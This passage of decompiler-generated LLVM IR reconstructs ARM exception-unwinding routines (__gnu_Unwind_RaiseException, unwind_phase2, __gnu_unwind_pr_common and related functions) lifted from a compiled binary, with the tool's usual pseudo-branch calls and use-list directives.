  br label %dec_label_pc_188d8

; uselistorder directives
  uselistorder i32 %v11_18898, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
  uselistorder i32* @r3, { 107, 108, 40, 41, 29, 109, 110, 32, 111, 112, 3, 113, 114, 115, 4, 116, 117, 118, 5, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 140, 30, 31, 33, 34, 35, 36, 37, 38, 39, 91, 65, 66, 67, 141, 142, 155, 156, 157, 145, 146, 147, 148, 149, 1, 150, 6, 43, 44, 143, 144, 56, 57, 104, 105, 106, 101, 102, 97, 98, 100, 99, 9, 10, 11, 161, 158, 159, 160, 2, 162, 163, 164, 42, 68, 45, 46, 47, 48, 49, 50, 151, 152, 153, 154, 58, 59, 60, 75, 76, 77, 78, 69, 70, 71, 8, 79, 80, 81, 82, 83, 24, 25, 26, 27, 12, 18, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 28, 51, 52, 53, 103, 54, 55, 61, 62, 63, 64, 72, 7, 73, 74, 84, 85, 86, 87, 88, 89, 90, 92, 93, 94, 95, 96 }
  uselistorder i32 10, { 4, 5, 29, 30, 31, 8, 43, 42, 75, 0, 39, 40, 74, 44, 45, 1, 10, 33, 34, 28, 11, 27, 12, 13, 14, 24, 6, 35, 25, 15, 3, 26, 36, 16, 37, 38, 32, 17, 18, 19, 41, 9, 46, 47, 2, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 20, 59, 60, 61, 21, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 7, 72, 22, 73, 23 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_189a0, { 1, 0 }
  uselistorder label %dec_label_pc_18944, { 1, 0 }
  uselistorder label %dec_label_pc_18940, { 1, 0 }
  uselistorder label %dec_label_pc_188f0, { 1, 0 }
  uselistorder label %dec_label_pc_188dc, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_189b4 = add i32 %ucbp, 12
  %v3_189b4 = inttoptr i32 %v2_189b4 to i32*
  store i32 %stop_fn, i32* %v3_189b4, align 4
  %v3_189b8 = add i32 %ucbp, 24
  %v4_189b8 = inttoptr i32 %v3_189b8 to i32*
  store i32 %tmp, i32* %v4_189b8, align 4
  %v1_189bc = add i32 %entry_vrs, 60
  %v2_189bc = inttoptr i32 %v1_189bc to i32*
  %v3_189bc = load i32, i32* %v2_189bc, align 4
  %v2_189c4 = add i32 %entry_vrs, 64
  %v3_189c4 = inttoptr i32 %v2_189c4 to i32*
  store i32 %v3_189bc, i32* %v3_189c4, align 4
  %v3_189cc = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_189cc

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_189e46 = add i32 %vrs, 64
  %v2_189e47 = inttoptr i32 %v1_189e46 to i32*
  %v3_189e48 = load i32, i32* %v2_189e47, align 4
  %v2_189e89 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_189e48)
  store i32 %v2_189e89, i32* %r0.global-to-local, align 4
  %v2_189ec11 = icmp eq i32 %v2_189e89, 0
  br i1 %v2_189ec11, label %dec_label_pc_189f4, label %dec_label_pc_18a24

dec_label_pc_189f4:                               ; preds = %entry, %dec_label_pc_189f4.dec_label_pc_189e0_crit_edge
  %v0_189f4 = load i32, i32* @r5, align 4
  %v1_189f4 = add i32 %v0_189f4, 64
  %v2_189f4 = inttoptr i32 %v1_189f4 to i32*
  %v3_189f4 = load i32, i32* %v2_189f4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_189fc = load i32, i32* @r4, align 4
  %v2_189fc = add i32 %v1_189fc, 20
  %v3_189fc = inttoptr i32 %v2_189fc to i32*
  store i32 %v3_189f4, i32* %v3_189fc, align 4
  %v0_18a00 = load i32, i32* @r4, align 4
  %v1_18a08 = add i32 %v0_18a00, 16
  %v2_18a08 = inttoptr i32 %v1_18a08 to i32*
  %v3_18a08 = load i32, i32* %v2_18a08, align 4
  call void @__pseudo_branch(i32 %v3_18a08)
  %v0_18a14 = load i32, i32* %r0.global-to-local, align 4
  %v7_18a14 = icmp eq i32 %v0_18a14, 8
  br i1 %v7_18a14, label %dec_label_pc_189f4.dec_label_pc_189e0_crit_edge, label %dec_label_pc_18a1c

dec_label_pc_189f4.dec_label_pc_189e0_crit_edge:  ; preds = %dec_label_pc_189f4
  %v0_189e0.pre = load i32, i32* @r4, align 4
  %v0_189e4.pre = load i32, i32* @r5, align 4
  store i32 %v0_189e0.pre, i32* %r0.global-to-local, align 4
  %v1_189e4 = add i32 %v0_189e4.pre, 64
  %v2_189e4 = inttoptr i32 %v1_189e4 to i32*
  %v3_189e4 = load i32, i32* %v2_189e4, align 4
  %v2_189e8 = call i32 @get_eit_entry(i32 %v0_189e0.pre, i32 %v3_189e4)
  store i32 %v2_189e8, i32* %r0.global-to-local, align 4
  %v2_189ec = icmp eq i32 %v2_189e8, 0
  br i1 %v2_189ec, label %dec_label_pc_189f4, label %dec_label_pc_18a24

dec_label_pc_18a1c:                               ; preds = %dec_label_pc_189f4
  %v7_18a1c = icmp eq i32 %v0_18a14, 7
  br i1 %v7_18a1c, label %dec_label_pc_18a28, label %dec_label_pc_18a24

dec_label_pc_18a24:                               ; preds = %entry, %dec_label_pc_189f4.dec_label_pc_189e0_crit_edge, %dec_label_pc_18a1c
  %v0_18a24 = call i32 @abort()
  store i32 %v0_18a24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18a28

dec_label_pc_18a28:                               ; preds = %dec_label_pc_18a1c, %dec_label_pc_18a24
  %v0_18a28 = load i32, i32* @r5, align 4
  %v1_18a28 = add i32 %v0_18a28, 4
  store i32 %v1_18a28, i32* %r0.global-to-local, align 4
  %v1_18a2c = inttoptr i32 %v1_18a28 to i32*
  %v2_18a2c = call i32 @__restore_core_regs(i32* %v1_18a2c)
  store i32 %v2_18a2c, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_18a28, { 1, 0 }
  uselistorder label %dec_label_pc_18a24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_189f4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_18a30 = add i32 %ucbp, 20
  %v2_18a30 = inttoptr i32 %v1_18a30 to i32*
  %v3_18a30 = load i32, i32* %v2_18a30, align 4
  %v1_18a38 = load i32, i32* %r1.global-to-local, align 4
  %v2_18a38 = add i32 %v1_18a38, 64
  %v3_18a38 = inttoptr i32 %v2_18a38 to i32*
  store i32 %v3_18a30, i32* %v3_18a38, align 4
  %v1_18a3c = add i32 %ucbp, 12
  %v2_18a3c = inttoptr i32 %v1_18a3c to i32*
  %v3_18a3c = load i32, i32* %v2_18a3c, align 4
  %v2_18a40 = icmp eq i32 %v3_18a3c, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_18a4c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_18a4c, i32* @r5, align 4
  br i1 %v2_18a40, label %dec_label_pc_18a54, label %dec_label_pc_18a90

dec_label_pc_18a54:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_18a60 = add i32 %ucbp, 16
  %v2_18a60 = inttoptr i32 %v1_18a60 to i32*
  %v3_18a60 = load i32, i32* %v2_18a60, align 4
  call void @__pseudo_branch(i32 %v3_18a60)
  br i1 false, label %dec_label_pc_18a88, label %dec_label_pc_18a74

dec_label_pc_18a74:                               ; preds = %dec_label_pc_18a54
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_13848.559 to i32))
  %v0_18a7c = load i32, i32* @r4, align 4
  %v0_18a80 = load i32, i32* @r5, align 4
  store i32 %v0_18a80, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_18a7c, i32 %v0_18a80)
  br label %dec_label_pc_18a88

dec_label_pc_18a88:                               ; preds = %dec_label_pc_18a54, %dec_label_pc_18a74
  %v0_18a88 = load i32, i32* @r5, align 4
  %v1_18a88 = add i32 %v0_18a88, 4
  %v1_18a8c = inttoptr i32 %v1_18a88 to i32*
  %v2_18a8c = call i32 @__restore_core_regs(i32* %v1_18a8c)
  %v1_18a94.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18a90

dec_label_pc_18a90:                               ; preds = %entry, %dec_label_pc_18a88
  %v1_18a94 = phi i32 [ %v0_18a4c, %entry ], [ %v1_18a94.pre, %dec_label_pc_18a88 ]
  %v3_18a94 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_18a94, i32 1)
  %v0_18a98 = call i32 @abort()
  ret i32 %v0_18a98

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 45, 46, 47, 48, 49, 51, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 32, 56, 60, 59, 58, 52, 53, 40, 41, 42, 43, 44, 54, 55, 57, 35, 36, 50, 33, 37, 34, 26, 27, 23, 24, 25, 0, 28, 29, 30, 31, 38, 39, 1, 2, 3 }
  uselistorder i1 true, { 0, 1, 2, 3, 96, 139, 4, 140, 141, 142, 143, 5, 82, 115, 144, 6, 81, 145, 7, 80, 146, 147, 148, 149, 8, 150, 116, 9, 84, 151, 10, 83, 152, 153, 11, 154, 155, 156, 12, 157, 158, 13, 159, 14, 118, 160, 161, 117, 162, 163, 15, 85, 16, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 18, 87, 19, 174, 175, 176, 20, 86, 177, 21, 17, 178, 179, 22, 180, 181, 182, 23, 183, 184, 185, 186, 187, 24, 25, 119, 26, 27, 28, 138, 88, 188, 189, 89, 190, 121, 191, 192, 30, 193, 194, 31, 90, 196, 29, 197, 195, 198, 120, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 92, 43, 44, 45, 46, 47, 98, 200, 218, 79, 93, 100, 204, 103, 102, 101, 48, 51, 199, 91, 99, 201, 202, 203, 124, 205, 206, 207, 208, 209, 52, 53, 210, 211, 212, 213, 125, 214, 215, 49, 50, 216, 217, 123, 122, 54, 55, 56, 219, 57, 58, 104, 105, 111, 106, 112, 107, 110, 220, 108, 114, 221, 59, 222, 60, 223, 126, 127, 224, 128, 129, 225, 130, 131, 61, 62, 226, 132, 133, 63, 64, 227, 134, 135, 65, 66, 228, 136, 137, 67, 68, 97, 229, 230, 113, 231, 69, 109, 70, 71, 94, 72, 73, 95, 74, 75, 76, 77, 78 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_18a90, { 1, 0 }
  uselistorder label %dec_label_pc_18a88, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18a9c = load i32, i32* @r4, align 4
  store i32 %v3_18a9c, i32* %stack_var_-16, align 4
  %v6_18a9c = load i32, i32* @r5, align 4
  %v9_18a9c = load i32, i32* @r6, align 4
  %v12_18a9c = load i32, i32* @lr, align 4
  %v1_18aa0 = add i32 %entry_vrs, 60
  %v2_18aa0 = inttoptr i32 %v1_18aa0 to i32*
  %v3_18aa0 = load i32, i32* %v2_18aa0, align 4
  %v2_18aa4 = add i32 %entry_vrs, 64
  %v3_18aa4 = inttoptr i32 %v2_18aa4 to i32*
  store i32 %v3_18aa0, i32* %v3_18aa4, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_18ad4 = load i32, i32* %v3_18aa4, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_18aec = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18ad4)
  %v2_18af0 = icmp eq i32 %v2_18aec, 0
  br i1 %v2_18af0, label %dec_label_pc_18af8, label %dec_label_pc_18b2c

dec_label_pc_18af8:                               ; preds = %entry
  %v0_18af8 = load i32, i32* @r5, align 4
  %v1_18b00 = add i32 %v0_18af8, 16
  %v2_18b00 = inttoptr i32 %v1_18b00 to i32*
  %v3_18b00 = load i32, i32* %v2_18b00, align 4
  call void @__pseudo_branch(i32 %v3_18b00)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_18b18 = load i32, i32* %saved_vrs_-320, align 4
  %v1_18b1c = urem i32 %v2_18b18, 2
  %v2_18b1c = icmp eq i32 %v1_18b1c, 0
  br i1 %v2_18b1c, label %dec_label_pc_18b3c, label %dec_label_pc_18b24

dec_label_pc_18b24:                               ; preds = %dec_label_pc_18af8, %dec_label_pc_18b3c
  %v0_18b24 = phi i1 [ false, %dec_label_pc_18af8 ], [ %phitmp, %dec_label_pc_18b3c ]
  br i1 %v0_18b24, label %dec_label_pc_18b48, label %dec_label_pc_18b2c

dec_label_pc_18b2c:                               ; preds = %entry, %dec_label_pc_18b24
  %v2_18b34 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18b34, i32* @r4, align 4
  store i32 %v6_18a9c, i32* @r5, align 4
  store i32 %v9_18a9c, i32* @r6, align 4
  store i32 %v12_18a9c, i32* @lr, align 4
  ret i32 9

dec_label_pc_18b3c:                               ; preds = %dec_label_pc_18af8
  %v2_18b3c = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_18b3c, i32* @r0, align 4
  %v1_18b40 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_18b3c)
  %v0_18b24.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_18b24.pre, 6
  br label %dec_label_pc_18b24

dec_label_pc_18b48:                               ; preds = %dec_label_pc_18b24
  %v0_18b48 = load i32, i32* @r5, align 4
  %v0_18b4c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_18b48, i32 %v0_18b4c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18b2c, { 1, 0 }
  uselistorder label %dec_label_pc_18b24, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_18b54 = add i32 %ucbp, 12
  %v2_18b54 = inttoptr i32 %v1_18b54 to i32*
  %v3_18b54 = load i32, i32* %v2_18b54, align 4
  %v2_18b58 = icmp eq i32 %v3_18b54, 0
  br i1 %v2_18b58, label %dec_label_pc_18b60, label %dec_label_pc_18b64

dec_label_pc_18b60:                               ; preds = %entry
  %v2_18b60 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_18b64

dec_label_pc_18b64:                               ; preds = %entry, %dec_label_pc_18b60
  %v1_18b64 = add i32 %entry_vrs, 60
  %v2_18b64 = inttoptr i32 %v1_18b64 to i32*
  %v3_18b64 = load i32, i32* %v2_18b64, align 4
  %v2_18b6c = add i32 %entry_vrs, 64
  %v3_18b6c = inttoptr i32 %v2_18b6c to i32*
  store i32 %v3_18b64, i32* %v3_18b6c, align 4
  %v3_18b70 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_18b70

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 1, 0, 2 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_18b64, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_18bd0

bb:                                               ; preds = %entry
  %v7_18b88 = mul i32 %regclass, 4
  %v8_18b88 = add i32 %v7_18b88, ptrtoint (i32* @global_var_18b90.711 to i32)
  call void @__pseudo_branch(i32 %v8_18b88)
  br label %dec_label_pc_18bd0

dec_label_pc_18bd0:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_18cb8 = load i32, i32* @r4, align 4
  %v6_18cb8 = load i32, i32* @r5, align 4
  %v2_18cc8 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_18cd0 = add i32 %ucbp, 76
  %v2_18cd0 = inttoptr i32 %v1_18cd0 to i32*
  %v3_18cd0 = load i32, i32* %v2_18cd0, align 4
  %v1_18cdc = inttoptr i32 %v3_18cd0 to i32*
  %v2_18cdc = load i32, i32* %v1_18cdc, align 4
  store i32 %v2_18cdc, i32* @lr, align 4
  %v4_18cdc = add i32 %v3_18cd0, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_18ce8 = urem i32 %state, 4
  store i32 %v1_18ce8, i32* %r2.global-to-local, align 4
  %v1_18cec = and i32 %state, 8
  store i32 %v1_18cec, i32* %r0.global-to-local, align 4
  %v4_18cfc = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_18cdc, i32* %v4_18cfc, align 8
  br i1 %v2_18cc8, label %dec_label_pc_18d0c, label %dec_label_pc_18fe8

dec_label_pc_18d0c:                               ; preds = %entry
  %v3_18d0c = mul i32 %v2_18cdc, 256
  store i32 %v3_18d0c, i32* %v4_18cfc, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18d24

dec_label_pc_18d24:                               ; preds = %dec_label_pc_18fe8, %dec_label_pc_18d0c
  %v0_18d48647090 = phi i32 [ %v2_19000, %dec_label_pc_18fe8 ], [ %v4_18cdc, %dec_label_pc_18d0c ]
  store i32 %v1_18ce8, i32* %r2.global-to-local, align 4
  %v1_18d28 = add i32 %ucbp, 80
  %v2_18d28 = inttoptr i32 %v1_18d28 to i32*
  %v3_18d28 = load i32, i32* %v2_18d28, align 4
  %v7_18d2c = icmp eq i32 %v1_18ce8, 2
  br i1 %v7_18d2c, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_18d24
  %v2_18d30 = add i32 %ucbp, 56
  %v3_18d30 = inttoptr i32 %v2_18d30 to i32*
  %v4_18d30 = load i32, i32* %v3_18d30, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18d24, %bb
  %v0_18d486470 = phi i32 [ %v0_18d48647090, %dec_label_pc_18d24 ], [ %v4_18d30, %bb ]
  %v1_18d34 = urem i32 %v3_18d28, 2
  %v2_18d34 = icmp eq i32 %v1_18d34, 0
  br i1 %v2_18d34, label %dec_label_pc_18d48.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_18e08

dec_label_pc_18d48.preheader:                     ; preds = %bb148
  %v1_18d486571 = inttoptr i32 %v0_18d486470 to i32*
  %v2_18d486672 = load i32, i32* %v1_18d486571, align 4
  %v2_18d4c6874 = icmp eq i32 %v2_18d486672, 0
  br i1 %v2_18d4c6874, label %dec_label_pc_18e08, label %dec_label_pc_18d54.preheader.lr.ph.lr.ph

dec_label_pc_18d54.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_18d48.preheader
  %v7_18d58 = icmp eq i32 %id, 2
  %v2_18de4 = icmp eq i32 %v1_18ce8, 0
  %v2_18fb0 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_18ecc = icmp eq i32 %v1_18cec, 0
  br label %dec_label_pc_18d54.preheader.lr.ph

dec_label_pc_18d54.preheader.lr.ph:               ; preds = %dec_label_pc_18d54.preheader.lr.ph.lr.ph, %dec_label_pc_1901c
  %v1_18d6496 = phi i32 [ %v2_18d486672, %dec_label_pc_18d54.preheader.lr.ph.lr.ph ], [ %v2_18d4866, %dec_label_pc_1901c ]
  %v1_18d6093 = phi i32 [ %v0_18d486470, %dec_label_pc_18d54.preheader.lr.ph.lr.ph ], [ %v2_19020, %dec_label_pc_1901c ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_18d54.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_1901c ]
  br label %dec_label_pc_18d54.preheader

dec_label_pc_18d54.preheader:                     ; preds = %dec_label_pc_18d54.preheader.lr.ph, %dec_label_pc_18fe0
  %v1_18d6495 = phi i32 [ %v1_18d6496, %dec_label_pc_18d54.preheader.lr.ph ], [ %v2_18d48, %dec_label_pc_18fe0 ]
  %v1_18d6092 = phi i32 [ %v1_18d6093, %dec_label_pc_18d54.preheader.lr.ph ], [ %v1_18fe0, %dec_label_pc_18fe0 ]
  br label %dec_label_pc_18d54

dec_label_pc_18d54:                               ; preds = %dec_label_pc_18d54.preheader, %dec_label_pc_18df8
  %v1_18d64 = phi i32 [ %v1_18d6495, %dec_label_pc_18d54.preheader ], [ %v2_18dfc, %dec_label_pc_18df8 ]
  %v1_18d78 = phi i32 [ %v1_18d6092, %dec_label_pc_18d54.preheader ], [ %v1_18df8, %dec_label_pc_18df8 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_18d58, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_18d54
  %v2_18d5c = add i32 %v1_18d78, 4
  %v3_18d5c = inttoptr i32 %v2_18d5c to i32*
  %v4_18d5c = load i32, i32* %v3_18d5c, align 4
  store i32 %v4_18d5c, i32* @r5, align 4
  store i32 %v1_18d64, i32* @r6, align 4
  %v0_18d68109 = load i32, i32* @r8, align 4
  %v1_18d68110 = add i32 %v0_18d68109, 72
  %v2_18d68111 = inttoptr i32 %v1_18d68110 to i32*
  %v3_18d68112 = load i32, i32* %v2_18d68111, align 4
  store i32 %v3_18d68112, i32* @lr, align 4
  %v2_18d74 = add i32 %v1_18d78, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_18d54
  %v2_18d60 = add i32 %v1_18d78, 2
  %v3_18d60 = inttoptr i32 %v2_18d60 to i16*
  %v4_18d60 = load i16, i16* %v3_18d60, align 2
  %v5_18d60 = zext i16 %v4_18d60 to i32
  store i32 %v5_18d60, i32* @r5, align 4
  %v0_18d68 = load i32, i32* @r8, align 4
  %v1_18d68 = add i32 %v0_18d68, 72
  %v2_18d68 = inttoptr i32 %v1_18d68 to i32*
  %v3_18d68 = load i32, i32* %v2_18d68, align 4
  store i32 %v3_18d68, i32* @lr, align 4
  %v2_18d70 = inttoptr i32 %v1_18d78 to i16*
  %v3_18d70 = load i16, i16* %v2_18d70, align 2
  %v4_18d70 = zext i16 %v3_18d70 to i32
  store i32 %v4_18d70, i32* @r6, align 4
  %v2_18d78 = add i32 %v1_18d78, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_18d78, %.thread16 ], [ %v2_18d74, %bb151 ]
  %v3_18d68115 = phi i32 [ %v3_18d68, %.thread16 ], [ %v3_18d68112, %bb151 ]
  %v0_18d80113 = phi i32 [ %v5_18d60, %.thread16 ], [ %v4_18d5c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_18d80 = and i32 %v0_18d80113, -2
  %v2_18d84 = add i32 %v1_18d80, %v3_18d68115
  store i32 %v2_18d84, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18d94 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18d94, i32* %r0.global-to-local, align 4
  %v5_18da0 = call i32 @_Unwind_VRS_Get(i32 %v0_18d94, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18da0, i32* %r0.global-to-local, align 4
  %v3_18da4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_18da4, i32* %r2.global-to-local, align 4
  %v0_18da8 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_18da8, %v3_18da4
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_18db4

._crit_edge:                                      ; preds = %bb152
  %v0_18dcc.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_18db4:                               ; preds = %bb152
  %v0_18db4 = load i32, i32* @r6, align 4
  %v1_18db4 = and i32 %v0_18db4, -2
  %v2_18db8 = add i32 %v1_18db4, %v0_18da8
  %v3_18dbc = icmp ult i32 %v3_18da4, %v2_18db8
  br i1 %v3_18dbc, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_18db4
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_18db4
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_18dcc = phi i32 [ %v0_18dcc.pre, %._crit_edge ], [ %v0_18db4, %bb153 ], [ %v0_18db4, %.thread20 ]
  %v0_18f74 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_18dc8 = load i32, i32* @r5, align 4
  %v1_18dcc = urem i32 %v0_18dcc, 2
  %v1_18dc8 = mul i32 %v0_18dc8, 2
  %v3_18dd0 = and i32 %v1_18dc8, 2
  %v4_18dd0 = or i32 %v3_18dd0, %v1_18dcc
  store i32 %v4_18dd0, i32* %r2.global-to-local, align 4
  %v7_18dd4 = icmp eq i32 %v4_18dd0, 1
  br i1 %v7_18dd4, label %dec_label_pc_18f68, label %dec_label_pc_18ddc

dec_label_pc_18ddc:                               ; preds = %bb154
  %v2_18dd4 = icmp eq i32 %v4_18dd0, 0
  br i1 %v2_18dd4, label %dec_label_pc_18de0, label %dec_label_pc_18e90

dec_label_pc_18de0:                               ; preds = %dec_label_pc_18ddc
  store i32 %v1_18ce8, i32* %r2.global-to-local, align 4
  br i1 %v2_18de4, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_18de0
  %v0_18df8119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_18df8

bb155:                                            ; preds = %dec_label_pc_18de0
  %v2_18df0 = icmp eq i32 %v0_18f74, 0
  %v0_18df8 = load i32, i32* @r7, align 4
  br i1 %v2_18df0, label %dec_label_pc_18df8, label %dec_label_pc_19170

dec_label_pc_18df8:                               ; preds = %.thread, %bb155
  %v0_18df8120 = phi i32 [ %v0_18df8119, %.thread ], [ %v0_18df8, %bb155 ]
  %v1_18df8 = add i32 %v0_18df8120, 4
  %v1_18dfc = inttoptr i32 %v1_18df8 to i32*
  %v2_18dfc = load i32, i32* %v1_18dfc, align 4
  %v2_18e00 = icmp eq i32 %v2_18dfc, 0
  br i1 %v2_18e00, label %dec_label_pc_18e08, label %dec_label_pc_18d54

dec_label_pc_18e08:                               ; preds = %dec_label_pc_1901c, %dec_label_pc_18fe0, %dec_label_pc_18df8, %dec_label_pc_18d48.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_18d48.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18df8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18fe0 ], [ %stack_var_-76.4, %dec_label_pc_1901c ]
  %v0_18e08 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18e08, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_18e10 = call i32 @__gnu_unwind_execute(i32 %v0_18e08, %anon_struct_13* %tmp156)
  store i32 %v4_18e10, i32* %r0.global-to-local, align 4
  store i32 %v4_18e10, i32* %r5.global-to-local, align 4
  %v2_18e14 = icmp eq i32 %v4_18e10, 0
  br i1 %v2_18e14, label %dec_label_pc_18e1c, label %dec_label_pc_18e98

dec_label_pc_18e1c:                               ; preds = %dec_label_pc_18e08
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_18e20 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_18e20, label %bb157, label %dec_label_pc_18e2c

bb157:                                            ; preds = %dec_label_pc_18e1c
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e9c

